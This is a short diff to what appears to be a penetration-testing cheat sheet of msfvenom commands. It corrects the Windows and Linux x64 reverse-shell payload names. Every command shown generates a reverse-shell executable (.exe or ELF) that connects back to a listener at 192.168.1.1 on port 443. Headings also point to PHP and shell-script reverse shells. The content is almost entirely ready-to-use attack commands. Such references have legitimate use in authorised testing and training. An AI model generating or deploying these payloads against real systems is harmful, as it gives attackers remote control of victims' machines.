@@ -66,7 +66,7 @@ Staged payload
 
 ###### .exe reverse shell
 ```
-> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe > shell.exe
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe > shell.exe
 ```
 
 ###### PHP reverse shell
@@ -81,7 +81,7 @@ Need to add the <?php at the first line of the file so that it will execute as a
 x86
 > msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > shell.elf
 x64
-> msfvenom -p linux/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > shell.elf
+> msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > shell.elf
 ```
 
 ###### .sh reverse shell
